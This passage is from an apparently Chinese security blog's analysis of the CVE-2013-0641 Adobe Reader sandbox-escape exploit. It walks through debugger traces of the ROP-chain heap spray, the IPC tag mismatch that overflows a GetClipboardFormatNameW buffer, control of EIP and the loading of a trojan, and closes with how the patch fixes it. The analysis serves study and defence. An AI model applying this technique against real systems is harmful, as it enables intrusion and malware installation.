<span class="number">089</span>c2276 <span class="number">750</span>c            jne     D+<span class="number">0x2284</span> (<span class="number">089</span>c2284)
<span class="number">089</span>c2278 <span class="number">680000800</span>c      push    offset &lt;Unloaded_ow.api&gt;+<span class="number">0xc7fffef</span> (<span class="number">0</span>c800000)
<span class="number">089</span>c227d e8cb080000      call    D!initOLEcontainer+<span class="number">0x7c1</span> (<span class="number">089</span>c2b4d)
<span class="number">089</span>c2282 <span class="number">89</span>c6            mov     esi,eax
<span class="number">089</span>c2284 <span class="number">6</span>a01            push    <span class="number">1</span>
<span class="number">089</span>c2286 <span class="number">680000800</span>c      push    offset &lt;Unloaded_ow.api&gt;+<span class="number">0xc7fffef</span> (<span class="number">0</span>c800000)
<span class="number">089</span>c228b <span class="number">56</span>              push    esi
...
</code></pre><p>在D+227d处会加载clbcatq.dll并检测其大小，利用clbcatq.dll的代码来构造ROP链，然后开辟共享内存，将ROP链堆喷到共享内存中，大小为0xc800000<br><img src="http://o9xrwsn0z.bkt.clouddn.com/adobe-cve-2013-0641-3.jpg" alt=""></p>
<p>Sub_10002940<br><img src="http://o9xrwsn0z.bkt.clouddn.com/adobe-cve-2013-0641-4.jpg" alt=""></p>
<p>加载过clbcatq.dll后会用clbcatq.dll中的代码构造ROP链，关键代码如下：<br><img src="http://o9xrwsn0z.bkt.clouddn.com/adobe-cve-2013-0641-5.jpg" alt=""></p>
<p>Loc_10002B0A<br><img src="http://o9xrwsn0z.bkt.clouddn.com/adobe-cve-2013-0641-6.jpg" alt=""></p>
<p>最后构造的ROP链如下：size=0x400<br><img src="http://o9xrwsn0z.bkt.clouddn.com/adobe-cve-2013-0641-7.jpg" alt=""><br><img src="http://o9xrwsn0z.bkt.clouddn.com/adobe-cve-2013-0641-8.jpg" alt=""></p>
<p>然后在Loc_10002bb2—-Loc_10002b97中调用call sub_100030d0将L2P.T木马路径复制到共享内存中。<br>拷贝函数在text：1002b67    call sub_100030d0<br><img src="http://o9xrwsn0z.bkt.clouddn.com/adobe-cve-2013-0641-9.jpg" alt=""></p>
<p>拷贝过后将指针返回给eax=30830028（call sub_100030d0）<br><img src="http://o9xrwsn0z.bkt.clouddn.com/adobe-cve-2013-0641-10.png" alt=""></p>
<p>之后开始完成ROP链堆喷射在木马路径后边，总大小为0xc800000，从而能够在08080820处占坑，ROP链堆喷从0x30830428(3d030028-0c800000+400)到0x3d030028之间。函数如下：<br><img src="http://o9xrwsn0z.bkt.clouddn.com/adobe-cve-2013-0641-11.jpg" alt=""></p>
<h3 id="Step3:_布局broker_process内存">Step3: 布局broker process内存</h3><p>breakpoit</p>
<pre><code>sandbox process:
<span class="number">5</span> e <span class="number">089</span>c1c23     <span class="number">0001</span> (<span class="number">0001</span>)  <span class="number">0</span>:**** D+<span class="number">0x1c23</span>
brokerpocess:
<span class="number">0</span> e <span class="number">00472</span>c2c     <span class="number">0001</span> (<span class="number">0001</span>)  <span class="number">0</span>:**** AcroRd32+<span class="number">0x72c2c</span> <span class="comment">//AllocateHeap</span>
      断下以后--- <span class="number">1</span> e <span class="number">0040290</span>b     <span class="number">0001</span> (<span class="number">0001</span>)  <span class="number">0</span>:**** AcroRd32+<span class="number">0x290b</span> <span class="comment">//HeapAlloc</span>
<span class="number">2</span> e <span class="number">00472</span>c54     <span class="number">0001</span> (<span class="number">0001</span>)  <span class="number">0</span>:**** AcroRd32+<span class="number">0x72c54</span> <span class="comment">//ReadProcessMemory</span>
<span class="comment">////3 e 0048d6b8     0001 (0001)  0:**** AcroRd32+0x8d6b8 //HttpSendRequestA</span>
</code></pre><p>堆喷之后返回loc_10002284之后会调用IPC<br><img src="http://o9xrwsn0z.bkt.clouddn.com/adobe-cve-2013-0641-12.jpg" alt=""></p>
<p>Sandbox进程通过tag 0x5d调用 HttpSendRequestA函数，在调用HttpSendRequestA之前，broker进程对该调用进行检查，最后在D+0x1c28处调用call ipc读取相应内容到broker进程<br><img src="http://o9xrwsn0z.bkt.clouddn.com/adobe-cve-2013-0641-13.jpg" alt=""></p>
<p>调用tag 0x5d之前，此时 eax指向该IPC messager的结构头四个字节为标签0x5d,其中参数30830028对应的长度为0c800000<br><img src="http://o9xrwsn0z.bkt.clouddn.com/adobe-cve-2013-0641-14.jpg" alt=""></p>
<p>Call ipc之后被断下：<br><img src="http://o9xrwsn0z.bkt.clouddn.com/adobe-cve-2013-0641-15.jpg" alt=""></p>
<p>text:00472C2C  Call sub_4218c1会调用AllocateHeap申请大小为0x0c800000大小的内存块，调用关系如下：</p>
<pre><code><span class="comment">Call</span> <span class="comment">sub_4218c1</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="comment">sub_4218CC</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="comment">call</span> <span class="comment">loc_404FBA</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="comment">loc_404FD1</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="comment">call</span> <span class="comment">sub_4028C6</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span> <span class="comment">loc_4028F7</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="comment">loc_402902</span>
</code></pre><p><img src="http://o9xrwsn0z.bkt.clouddn.com/adobe-cve-2013-0641-16.jpg" alt=""></p>
<p>HeapAlloc：</p>
<pre><code>AcroRd32+<span class="number">0x290b</span>:
<span class="number">0040290</span>b ff155c734e00    call    dword ptr [AcroRd32+<span class="number">0xe735c</span> (<span class="number">004e735</span>c)] ds:<span class="number">0023</span>:<span class="number">004e735</span>c={ntdll!RtlAllocateHeap (<span class="number">7</span>c9100a4)}
<span class="number">0</span>:<span class="number">009</span>&gt; p
eax=<span class="number">02770020</span> ebx=<span class="number">0</span>c800000 ecx=<span class="number">7</span>c9101bb edx=<span class="number">003e0608</span> esi=<span class="number">00000000</span> edi=<span class="number">0</span>c800000
eip=<span class="number">00402911</span> esp=<span class="number">01</span>c4fc74 ebp=<span class="number">01</span>c4fc80 iopl=<span class="number">0</span>         nv up ei pl zr na pe nc
cs=<span class="number">001</span>b  ss=<span class="number">0023</span>  ds=<span class="number">0023</span>  es=<span class="number">0023</span>  fs=<span class="number">003</span>b  gs=<span class="number">0000</span>             efl=<span class="number">00000246</span>
AcroRd32+<span class="number">0x2911</span>:
<span class="number">00402911</span> <span class="number">8</span>bf8            mov     edi,eax
</code></pre><p>申请堆空间过后，返回堆指针eax;size=0c800000<br>dd eax<br><img src="http://o9xrwsn0z.bkt.clouddn.com/adobe-cve-2013-0641-17.jpg" alt=""></p>
<p>申请堆过后返回调用ReadProcessMemory函数，将申请的堆中写入大小为0x0c800000的数据。<br>ReadProcessMemory（00000148，30830028，02770020，0c800000，01c4fce8）</p>
<pre><code>第一个参数是 进程句柄，由OpenProcess函数获取；
第二个参数是要读出数据的地址，存放着我们堆喷的ROP链；<span class="number">30830028</span>
第三个参数是用于存放读取数据的地址，为申请的堆空间；<span class="number">02770020</span>
第四个参数是 要读出的数据大小；<span class="number">0</span>c800000
第五个参数是实际读出数据的大小；调用返回后将填写<span class="number">0</span>c800000
</code></pre><p>写入数据完成过后<br><img src="http://o9xrwsn0z.bkt.clouddn.com/adobe-cve-2013-0641-18.jpg" alt=""></p>
<p>从而覆盖到0808082c处刚好是构造的ROP链<br><img src="http://o9xrwsn0z.bkt.clouddn.com/adobe-cve-2013-0641-19.jpg" alt=""></p>
<h3 id="Step4:_触发漏洞，造成溢出">Step4: 触发漏洞，造成溢出</h3><p>breakpoit</p>
<pre><code>sandbox process:
<span class="number">6</span> e <span class="number">089</span>c1ea5     <span class="number">0001</span> (<span class="number">0001</span>)  <span class="number">0</span>:**** D+<span class="number">0x1ea5</span> <span class="comment">//tag(0x73)</span>
<span class="number">7</span> e <span class="number">089</span>c22be     <span class="number">0001</span> (<span class="number">0001</span>)  <span class="number">0</span>:**** D+<span class="number">0x22be</span> <span class="comment">//push 9c，call ipc（0x73）</span>
broker process
<span class="number">4</span> e <span class="number">00496352</span>     <span class="number">0001</span> (<span class="number">0001</span>)  <span class="number">0</span>:**** AcroRd32+<span class="number">0x96352</span> <span class="comment">//GetClipboardFormatNameW</span>
</code></pre><p>D.T在布局完broke process内存之后，开始构造GetClipboardFormatNameA 函数，长度为9ch，然后调用的lpc buffer，具体函数sub_10001E23<br><img src="http://o9xrwsn0z.bkt.clouddn.com/adobe-cve-2013-0641-20.jpg" alt=""></p>
<pre><code><span class="number">0</span>:<span class="number">006</span>&gt; dd eax
<span class="number">089</span>ed43c  <span class="number">00000073</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span>
<span class="number">089</span>ed44c  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span>
<span class="number">089</span>ed45c  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span>
<span class="number">089</span>ed46c  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000002</span>
<span class="number">089</span>ed47c  <span class="number">00000006</span> <span class="number">00000064</span> <span class="number">0000009</span>c <span class="number">00000002</span>
<span class="number">089</span>ed48c  <span class="number">00000100</span> <span class="number">00000004</span> ffffffff <span class="number">00000104</span>
<span class="number">089</span>ed49c  ffffffff <span class="number">42424242</span> <span class="number">42424242</span> <span class="number">42424242</span>
<span class="number">089</span>ed4ac  <span class="number">42424242</span> <span class="number">42424242</span> <span class="number">42424242</span> <span class="number">42424242</span>
</code></pre><p>GetClipboardFormatNameA的tag 是0x74，但是改成0x73之后，broker process 进程并没有检查，对于broker process来说，参数的类型对应的函数ANSI或者UNICODE无法得知，在检查参数和大小一致性后，就开始调用tag指定的GetClipboardFormatNameW函数。<br>Call IPC之后被断下：</p>
<pre><code>Breakpoint <span class="number">2</span> hit
eax=<span class="number">01</span>c4fdac ebx=<span class="number">00000000</span> ecx=<span class="number">00</span>b638c0 edx=<span class="number">0f</span>0ab140 esi=<span class="number">00</span>b638c0 edi=<span class="number">01</span>c4fdac
eip=<span class="number">00496352</span> esp=<span class="number">0106f</span>f64 ebp=<span class="number">0106f</span>f68 iopl=<span class="number">0</span>         nv up ei pl nz na pe nc
cs=<span class="number">001</span>b  ss=<span class="number">0023</span>  ds=<span class="number">0023</span>  es=<span class="number">0023</span>  fs=<span class="number">003</span>b  gs=<span class="number">0000</span>             efl=<span class="number">00000206</span>
AcroRd32+<span class="number">0x96352</span>:
<span class="number">00496352</span> <span class="number">8</span>b450c          mov     eax,dword ptr [ebp+<span class="number">0</span>Ch] ss:<span class="number">0023</span>:<span class="number">0106f</span>f74=<span class="number">0f</span>0ab140
</code></pre><p><img src="http://o9xrwsn0z.bkt.clouddn.com/adobe-cve-2013-0641-21.jpg" alt=""></p>
<p>GetClipboardFormatNameW API</p>
<pre><code>Function <span class="comment"> //接受从剪贴板中的指定的注册格式的名称，将该名称复制到指定的缓冲区。</span>
Retrieves <span class="built_in">from</span> <span class="operator">the</span> clipboard <span class="operator">the</span> name <span class="operator">of</span> <span class="operator">the</span> specified registered <span class="built_in">format</span>. The <span class="function"><span class="keyword">function</span> <span class="title">copies</span> <span class="title">the</span> <span class="title">name</span> <span class="title">to</span> <span class="title">the</span> <span class="title">specified</span> <span class="title">buffer</span>.</span>
Parameters
<span class="built_in">format</span> [<span class="operator">in</span>]
Type: UINT
The type <span class="operator">of</span> <span class="built_in">format</span> <span class="built_in">to</span> be retrieved. This parameter must <span class="operator">not</span> specify <span class="keyword">any</span> <span class="operator">of</span> <span class="operator">the</span> predefined clipboard formats.
lpszFormatName [out]
Type: LPTSTR
The buffer that is <span class="built_in">to</span> receive <span class="operator">the</span> <span class="built_in">format</span> name.
cchMaxCount [<span class="operator">in</span>]
Type: int
The maximum <span class="built_in">length</span>, <span class="operator">in</span> <span class="keyword">characters</span>, <span class="operator">of</span> <span class="operator">the</span> <span class="keyword">string</span> <span class="built_in">to</span> be copied <span class="built_in">to</span> <span class="operator">the</span> buffer. If <span class="operator">the</span> name exceeds this limit, <span class="keyword">it</span> is truncated.
</code></pre><p>调用 call ds:GetClipboardFormatNameW时3个参数<br><img src="http://o9xrwsn0z.bkt.clouddn.com/adobe-cve-2013-0641-22.jpg" alt=""></p>
<p>参数说明：</p>
<pre><code>Format:<span class="number">0x0000c10a</span>   <span class="comment">//step1注册</span>
lpszFormatName:<span class="number">0x0f0b26ac</span> <span class="comment">//接受buffer</span>
cchMaxCount:<span class="number">0x9c</span> <span class="comment">//size</span>
</code></pre><p>buffer中的数据：</p>
<pre><code><span class="number">0</span>:<span class="number">003</span>&gt; dd <span class="number">0f</span>0b26ac l40
<span class="number">0f</span>0b26ac  <span class="number">42424242</span> <span class="number">42424242</span> <span class="number">42424242</span> <span class="number">42424242</span>
<span class="number">0f</span>0b26bc  <span class="number">42424242</span> <span class="number">42424242</span> <span class="number">42424242</span> <span class="number">42424242</span>
<span class="number">0f</span>0b26cc  <span class="number">42424242</span> <span class="number">42424242</span> <span class="number">42424242</span> <span class="number">42424242</span>
<span class="number">0f</span>0b26dc  <span class="number">42424242</span> <span class="number">42424242</span> <span class="number">42424242</span> <span class="number">42424242</span>
<span class="number">0f</span>0b26ec  <span class="number">42424242</span> <span class="number">42424242</span> <span class="number">42424242</span> <span class="number">42424242</span>
<span class="number">0f</span>0b26fc  <span class="number">42424242</span> <span class="number">42424242</span> <span class="number">42424242</span> <span class="number">42424242</span>
<span class="number">0f</span>0b270c  <span class="number">42424242</span> <span class="number">42424242</span> <span class="number">42424242</span> <span class="number">42424242</span>
<span class="number">0f</span>0b271c  <span class="number">42424242</span> <span class="number">42424242</span> <span class="number">42424242</span> <span class="number">42424242</span>
<span class="number">0f</span>0b272c  <span class="number">42424242</span> <span class="number">42424242</span> <span class="number">42424242</span> <span class="number">42424242</span>
<span class="number">0f</span>0b273c  <span class="number">42424242</span> <span class="number">42424242</span> <span class="number">42424242</span> <span class="number">0000</span>c10a  <span class="comment">// 0f0b26ac+0x9c=0f0b2748</span>
<span class="number">0f</span>0b274c  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> e478f5b3   
<span class="number">0f</span>0b275c  ff140100 <span class="number">0050</span>bf20 <span class="number">61e00000</span> <span class="number">00000000</span>   <span class="comment">//0f0b26ac+0x9c+0x18</span>
<span class="number">0f</span>0b276c  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span>
<span class="number">0f</span>0b277c  <span class="number">00000000</span> <span class="number">00000007</span> <span class="number">00000000</span> <span class="number">00000000</span>
</code></pre><p>初始的buffer是0x9c大小，传入的cchMaxCount也是0x9c，但是user32!GetClipboardFormatNameW实际数据拷贝大小为0x9c*2，从而覆盖了后续buffer的某些关键指针。执行过后覆盖某指针：</p>
<pre><code><span class="number">0</span>:<span class="number">003</span>&gt; dd <span class="number">0f</span>0b26ac l40
<span class="number">0f</span>0b26ac  <span class="number">08080020</span> <span class="number">08080020</span> <span class="number">08080020</span> <span class="number">08080020</span>
<span class="number">0f</span>0b26bc  <span class="number">08080020</span> <span class="number">08080020</span> <span class="number">08080020</span> <span class="number">08080020</span>
<span class="number">0f</span>0b26cc  <span class="number">08080020</span> <span class="number">08080020</span> <span class="number">08080020</span> <span class="number">08080020</span>
<span class="number">0f</span>0b26dc  <span class="number">08080020</span> <span class="number">08080020</span> <span class="number">08080020</span> <span class="number">08080020</span>
<span class="number">0f</span>0b26ec  <span class="number">08080020</span> <span class="number">08080020</span> <span class="number">08080020</span> <span class="number">08080020</span>
<span class="number">0f</span>0b26fc  <span class="number">08080020</span> <span class="number">08080020</span> <span class="number">08080020</span> <span class="number">08080020</span>
<span class="number">0f</span>0b270c  <span class="number">08080020</span> <span class="number">08080020</span> <span class="number">08080020</span> <span class="number">08080020</span>
<span class="number">0f</span>0b271c  <span class="number">08080020</span> <span class="number">08080020</span> <span class="number">08080020</span> <span class="number">08080020</span>
<span class="number">0f</span>0b272c  <span class="number">08080020</span> <span class="number">08080020</span> <span class="number">08080020</span> <span class="number">08080020</span>
<span class="number">0f</span>0b273c  <span class="number">08080020</span> <span class="number">08080020</span> <span class="number">08080020</span> <span class="number">08080020</span>
<span class="number">0f</span>0b274c  <span class="number">08080020</span> <span class="number">08080020</span> <span class="number">08080020</span> <span class="number">08080020</span>
<span class="number">0f</span>0b275c  <span class="number">08080020</span> <span class="number">08080020</span> <span class="number">08080020</span> <span class="number">08080020</span>     <span class="comment">// overflowed</span>
<span class="number">0f</span>0b276c  <span class="number">08080020</span> <span class="number">08080020</span> <span class="number">08080020</span> <span class="number">08080020</span>
<span class="number">0f</span>0b277c  <span class="number">08080020</span> <span class="number">08080020</span> <span class="number">08080020</span> <span class="number">08080020</span>
<span class="number">0f</span>0b278c  <span class="number">08080020</span> <span class="number">08080020</span> <span class="number">08080020</span> <span class="number">08080020</span>
<span class="number">0f</span>0b279c  <span class="number">08080020</span> <span class="number">08080020</span> <span class="number">08080020</span> <span class="number">08080020</span>
</code></pre><h3 id="Step5:_控制eip">Step5: 控制eip</h3><p>breakpoit</p>
<pre><code>sandbox process
<span class="number">8</span> e <span class="number">089</span>c2094     <span class="number">0001</span> (<span class="number">0001</span>)  <span class="number">0</span>:**** D+<span class="number">0x2094</span> <span class="comment">//call ipc(0xb0)</span>
broker process
<span class="number">5</span> e <span class="number">00497230</span>     <span class="number">0001</span> (<span class="number">0001</span>)  <span class="number">0</span>:**** AcroRd32+<span class="number">0x97230</span> <span class="comment">//控制eip</span>
</code></pre><p>D.T在溢出关键数据后，在Call sub_10002044再次调用tag id 0xb0，触发调用先前布置被覆盖的某对象：接着上边的调用返回后会调用sub_10002044<br><img src="http://o9xrwsn0z.bkt.clouddn.com/adobe-cve-2013-0641-23.jpg" alt=""></p>
<p>Call sub_10002044<br><img src="http://o9xrwsn0z.bkt.clouddn.com/adobe-cve-2013-0641-24.jpg" alt=""></p>
<p>在call sub_100018a3调用tag id 0xb0</p>
<pre><code><span class="number">0</span>:<span class="number">006</span>&gt; dd eax
<span class="number">089</span>ed43c  <span class="number">000000</span>b0 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span>
<span class="number">089</span>ed44c  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span>
<span class="number">089</span>ed45c  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span>
<span class="number">089</span>ed46c  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000001</span>
<span class="number">089</span>ed47c  <span class="number">00000002</span> <span class="number">00000058</span> <span class="number">00000004</span> ffffffff
<span class="number">089</span>ed48c  <span class="number">0000005</span>c ffffffff <span class="number">000003</span>ea <span class="number">00000000</span>
<span class="number">089</span>ed49c  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span>
<span class="number">089</span>ed4ac  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span>
</code></pre><p>调用call IPC之后被断下：<br><img src="http://o9xrwsn0z.bkt.clouddn.com/adobe-cve-2013-0641-25.jpg" alt=""></p>
<p>最后调用rop链加载木马L2P.T</p>
<h2 id="补丁">补丁</h2><p>Adobe已经推出补丁，最新的Reader 11.0.02 for xp_sp3_en对比发现tag 0x73在处理GetClipboardFormatNameW callback时对传入的cchMaxCount参数进行了处理，将长度先/2，再调用GetClipboardFormatNameW就不会发生溢出了。如下:<br><img src="http://o9xrwsn0z.bkt.clouddn.com/adobe-cve-2013-0641-26.jpg" alt=""></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.idhyt.com/2013/03/21/exploit-cve-2013-0641/" data-id="civbwooab00485p6i6x4loqeo" class="article-share-link">Share</a>
      
        <a href="http://blog.idhyt.com/2013/03/21/exploit-cve-2013-0641/#disqus_thread" class="article-comment-link">留言</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/cve/">cve</a></li></ul>

    </footer>
  </div>
  
</article>


  


  <nav id="page-nav">
    <a class="extend prev" rel="prev" href="/page/6/">&laquo; __('prev')</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><a class="page-number" href="/page/6/">6</a><span class="page-number current">7</span><a class="page-number" href="/page/8/">8</a><a class="page-number" href="/page/9/">9</a><a class="extend next" rel="next" href="/page/8/">__('next') &raquo;</a>
  </nav>
</section>
        
          <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">分類</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/android/">android</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/diary/">diary</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/exploit/">exploit</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/python/">python</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/study/">study</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/technic/">technic</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/virus/">virus</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">標籤</h3>
    <div class="widget">
      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/adb/">adb</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/android/">android</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/challenge/">challenge</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cve/">cve</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/debug/">debug</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/english/">english</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/iovyroot/">iovyroot</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/kernel/">kernel</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/libstagefright/">libstagefright</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/lol/">lol</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/nvidia/">nvidia</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pingpongroot/">pingpongroot</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pxn/">pxn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/shellcode/">shellcode</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/smali/">smali</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sql/">sql</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/symbol/">symbol</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/task/">task</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/thread/">thread</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/uac/">uac</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/webview/">webview</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xposed/">xposed</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xss/">xss</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/下载/">下载</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/感染/">感染</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/推广/">推广</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/无法描述/">无法描述</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/流氓/">流氓</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/淘宝客/">淘宝客</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/盗号/">盗号</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/过滤/">过滤</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/驱动/">驱动</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">標籤雲</h3>
    <div class="widget tagcloud">
      <a href="/tags/adb/" style="font-size: 10px;">adb</a> <a href="/tags/android/" style="font-size: 10px;">android</a> <a href="/tags/challenge/" style="font-size: 13.33px;">challenge</a> <a href="/tags/cve/" style="font-size: 18.33px;">cve</a> <a href="/tags/debug/" style="font-size: 10px;">debug</a> <a href="/tags/english/" style="font-size: 13.33px;">english</a> <a href="/tags/iovyroot/" style="font-size: 10px;">iovyroot</a> <a href="/tags/kernel/" style="font-size: 10px;">kernel</a> <a href="/tags/libstagefright/" style="font-size: 11.67px;">libstagefright</a> <a href="/tags/lol/" style="font-size: 10px;">lol</a> <a href="/tags/nvidia/" style="font-size: 10px;">nvidia</a> <a href="/tags/pingpongroot/" style="font-size: 10px;">pingpongroot</a> <a href="/tags/pxn/" style="font-size: 10px;">pxn</a> <a href="/tags/shellcode/" style="font-size: 10px;">shellcode</a> <a href="/tags/smali/" style="font-size: 10px;">smali</a> <a href="/tags/sql/" style="font-size: 10px;">sql</a> <a href="/tags/symbol/" style="font-size: 10px;">symbol</a> <a href="/tags/task/" style="font-size: 10px;">task</a> <a href="/tags/thread/" style="font-size: 10px;">thread</a> <a href="/tags/uac/" style="font-size: 10px;">uac</a> <a href="/tags/webview/" style="font-size: 10px;">webview</a> <a href="/tags/xposed/" style="font-size: 11.67px;">xposed</a> <a href="/tags/xss/" style="font-size: 10px;">xss</a> <a href="/tags/下载/" style="font-size: 10px;">下载</a> <a href="/tags/感染/" style="font-size: 16.67px;">感染</a> <a href="/tags/推广/" style="font-size: 10px;">推广</a> <a href="/tags/无法描述/" style="font-size: 20px;">无法描述</a> <a href="/tags/流氓/" style="font-size: 10px;">流氓</a> <a href="/tags/淘宝客/" style="font-size: 10px;">淘宝客</a> <a href="/tags/盗号/" style="font-size: 13.33px;">盗号</a> <a href="/tags/过滤/" style="font-size: 11.67px;">过滤</a> <a href="/tags/驱动/" style="font-size: 15px;">驱动</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">彙整</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/11/">November 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/10/">October 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/09/">September 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/08/">August 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/07/">July 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/06/">June 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/05/">May 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/04/">April 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/03/">March 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/02/">February 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/01/">January 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/11/">November 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/10/">October 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/09/">September 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/08/">August 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/07/">July 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/05/">May 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/04/">April 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/03/">March 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/01/">January 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/10/">October 2014</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/09/">September 2014</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/08/">August 2014</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/07/">July 2014</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/01/">January 2014</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/12/">December 2013</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/11/">November 2013</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/07/">July 2013</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/05/">May 2013</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/03/">March 2013</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/01/">January 2013</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/12/">December 2012</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/11/">November 2012</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/10/">October 2012</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/07/">July 2012</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/06/">June 2012</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/04/">April 2012</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2011/12/">December 2011</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2011/07/">July 2011</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2011/06/">June 2011</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2011/05/">May 2011</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">最新文章</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2016/11/09/exploit-kernel-security-flaws/">KERNEL SECURITY FLAWS (0day for nexus4)</a>
          </li>
        
          <li>
            <a href="/2016/10/24/exploit-cve-2016-5195/">CVE-2016-5195</a>
          </li>
        
          <li>
